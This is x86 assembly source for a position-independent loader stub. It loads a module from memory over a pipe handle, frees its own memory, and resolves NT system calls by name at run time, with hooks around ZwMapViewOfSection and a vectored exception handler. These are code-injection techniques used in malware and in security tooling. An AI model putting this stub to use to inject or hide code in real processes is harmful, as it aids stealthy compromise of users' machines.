.686
.MODEL FLAT

; void *__fastcall GetFuncAddress(const char *)
extern ?GetFuncAddress@@YIPAXPBD@Z : PROC

; long __fastcall retFromMapViewOfSection(long)
extern ?retFromMapViewOfSection@@YIJJ@Z : PROC

; long __stdcall MyVexHandler(struct _EXCEPTION_POINTERS *)
extern ?MyVexHandler@@YGJPAU_EXCEPTION_POINTERS@@@Z : PROC

; long __fastcall LoadLibraryFromMem(void *,void *)
extern ?LoadLibraryFromMem@@YIJPAX0@Z : PROC

WSTRING macro text
  FORC arg, text
  DW '&arg'
  ENDM
  DW 0
endm

createWstring macro name, string
  ALIGN 2
  nop
name proc
  call @@1
  WSTRING string
@@1:
  pop eax
  ret
name endp
endm

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; .text$mn$asm 

_TEXT$asm SEGMENT ALIGN(16)

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; must be at section begin !!

; void __stdcall AsmEntry(void)
?AsmEntry@@YGXXZ proc
	nop
	nop
	nop
	call @@1
	DD 0 ; hPipe
@@1:
	pop edx
	mov edx,[edx] ; edx = hPipe
	mov ecx,[esp + 4] ; BaseAddress
	call ?LoadLibraryFromMem@@YIJPAX0@Z
	pop ecx ; ret
	pop edx ; BaseAddress
	mov eax,8000h
	push eax ; MEM_RELEASE
	mov [edx],edx
	lea eax,[edx + 4]
	push eax ; &RegionSize
	push edx ; &BaseAddress
	xor edx,edx
	mov [eax],edx ; RegionSize = 0
	dec edx
	push edx ; NtCurrentProcess()
	push ecx ; ret
	jmp _NtFreeVirtualMemory@16
?AsmEntry@@YGXXZ endp

; const wchar_t *__stdcall getSystem32(void)
createWstring ?getSystem32@@YGPB_WXZ, <\sYstem32\\\ >

; const wchar_t *__stdcall getDll(void)
createWstring ?getDll@@YGPB_WXZ, *.dll

; const char *__stdcall GetMapViewOfSection(void)
?GetMapViewOfSection@@YGPBDXZ proc
  call @@1
  DB 'ZwMapViewOfSection',0
@@1:
  pop eax
  ret
?GetMapViewOfSection@@YGPBDXZ endp

; void *__stdcall retFromMapViewOfSectionAddr(void)
?retFromMapViewOfSectionAddr@@YGPAXXZ proc
	call @@1
	mov ecx,eax
	call ?retFromMapViewOfSection@@YIJJ@Z
@@1:
	pop eax
	ret
?retFromMapViewOfSectionAddr@@YGPAXXZ endp

; long (__stdcall *__stdcall aMyVexHandler(void))(struct _EXCEPTION_POINTERS *)
?aMyVexHandler@@YGP6GJPAU_EXCEPTION_POINTERS@@@ZXZ proc
	call @@1
	jmp ?MyVexHandler@@YGJPAU_EXCEPTION_POINTERS@@@Z
@@1:
	pop eax
	ret
?aMyVexHandler@@YGP6GJPAU_EXCEPTION_POINTERS@@@ZXZ endp

common_imp_call proc private
	push ecx
	push edx
	mov ecx,eax
	call ?GetFuncAddress@@YIPAXPBD@Z
	pop edx
	pop ecx
	jmp eax
common_imp_call endp

NtApi MACRO name, n
@CatStr(_,name,@,n) proc
	call @@1
	DB '&name',0
@@1: 
	pop eax
	jmp common_imp_call
@CatStr(_,name,@,n) endp
ENDM

_NtApi MACRO name, n
@CatStr(_,name) proc
	call @@1
	DB '&name',0
@@1: 
	pop eax
	jmp common_imp_call
@CatStr(_,name) endp
ENDM

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; ++ Import

NtApi LdrGetProcedureAddress, 16
NtApi LdrLoadDll, 16
NtApi LdrUnloadDll, 4
NtApi LdrGetDllHandle, 16
NtApi LdrProcessRelocationBlock, 16

NtApi NtCreateSection, 28
NtApi ZwMapViewOfSection, 40
NtApi ZwUnmapViewOfSection, 8
NtApi ZwProtectVirtualMemory, 20

NtApi NtOpenFile, 24
NtApi NtQueryDirectoryFile, 44
NtApi NtClose, 4
NtApi NtReadFile, 36
NtApi NtWriteFile, 36

NtApi NtFreeVirtualMemory, 16

NtApi ZwSetContextThread, 8

NtApi RtlInitUnicodeString, 8
NtApi RtlEqualUnicodeString, 12
NtApi RtlAppendUnicodeStringToString, 8
NtApi RtlAppendUnicodeToString, 8
NtApi RtlGetNtSystemRoot, 0
NtApi RtlDosPathNameToNtPathName_U_WithStatus, 16
NtApi RtlFreeUnicodeString, 4

NtApi RtlAllocateHeap, 12
NtApi RtlFreeHeap, 12

NtApi RtlPushFrame, 4
NtApi RtlPopFrame, 4
NtApi RtlGetFrame, 0

NtApi RtlGetCurrentPeb, 0

NtApi RtlImageNtHeader, 4
NtApi RtlImageDirectoryEntryToData, 16

NtApi RtlAddVectoredExceptionHandler, 8
NtApi RtlRemoveVectoredExceptionHandler, 4 
NtApi RtlSetProtectedPolicy, 12

NtApi RtlWow64EnableFsRedirection, 4

_NtApi memset
_NtApi memcpy

;; -- Import
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

_TEXT$asm ENDS


end